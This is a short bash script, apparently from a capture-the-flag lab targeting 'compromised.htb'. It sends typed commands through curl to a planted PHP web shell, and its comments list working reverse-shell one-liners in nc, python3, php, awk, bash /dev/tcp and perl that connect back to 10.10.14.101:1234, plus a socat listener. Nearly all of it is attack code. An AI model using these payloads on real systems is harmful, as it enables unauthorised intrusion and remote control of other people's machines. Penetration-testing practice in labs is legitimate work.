#!/bin/bash

cmd=''
while [[ $cmd != 'exit' ]];
do
    read -p '$ > ' cmd
    curl -G compromised.htb/shop/vqmod/xml/rce.php? --data-urlencode "cmd=$cmd"
done
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.101 1234 >/tmp/f
# export RHOST="10.10.14.101";export RPORT=1234;/usr/bin/python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
# php -r '$sock=fsockopen("10.10.14.101",1234);exec("/bin/bash -i <&3 >&3 2>&3");'
# awk 'BEGIN {s = "/inet/tcp/0/10.10.14.101/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
# 0<&196;exec 196<>/dev/tcp/10.10.14.101/1234; sh <&196 >&196 2>&196

# /usr/bin/perl -e 'use Socket;$i="10.10.14.101";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# socat file:`tty`,raw,echo=ens160 TCP-L:1234